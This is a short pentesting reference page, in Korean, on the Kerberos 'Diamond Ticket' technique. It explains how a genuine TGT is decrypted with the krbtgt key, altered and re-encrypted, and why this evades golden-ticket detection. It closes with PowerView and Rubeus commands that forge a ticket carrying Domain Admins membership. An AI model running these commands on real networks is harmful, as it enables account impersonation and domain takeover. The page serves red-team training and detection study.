# Diamond Ticket

{{#include ../../banners/hacktricks-training.md}}

## Diamond Ticket

**황금 티켓처럼**, 다이아몬드 티켓은 **모든 사용자로서 모든 서비스에 접근할 수 있는 TGT**입니다. 황금 티켓은 완전히 오프라인에서 위조되며, 해당 도메인의 krbtgt 해시로 암호화된 후 로그온 세션에 전달되어 사용됩니다. 도메인 컨트롤러는 TGT를 추적하지 않기 때문에(또는 그들이 정당하게 발급한) 자신의 krbtgt 해시로 암호화된 TGT를 기꺼이 수용합니다.

황금 티켓 사용을 감지하는 두 가지 일반적인 기술이 있습니다:

- 해당 AS-REQ가 없는 TGS-REQ를 찾습니다.
- Mimikatz의 기본 10년 수명과 같은 어리석은 값을 가진 TGT를 찾습니다.

**다이아몬드 티켓**은 **DC에 의해 발급된 정당한 TGT의 필드를 수정하여 만들어집니다**. 이는 **TGT를 요청하고**, 도메인의 krbtgt 해시로 **복호화한 후**, 티켓의 원하는 필드를 **수정하고**, 다시 **암호화하는** 방식으로 이루어집니다. 이는 황금 티켓의 두 가지 단점을 **극복합니다**:

- TGS-REQ는 이전에 AS-REQ가 있습니다.
- TGT는 DC에 의해 발급되었으므로 도메인의 Kerberos 정책에서 모든 올바른 세부정보를 갖게 됩니다. 이러한 세부정보는 황금 티켓에서 정확하게 위조할 수 있지만, 더 복잡하고 실수의 여지가 있습니다.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
{{#include ../../banners/hacktricks-training.md}}
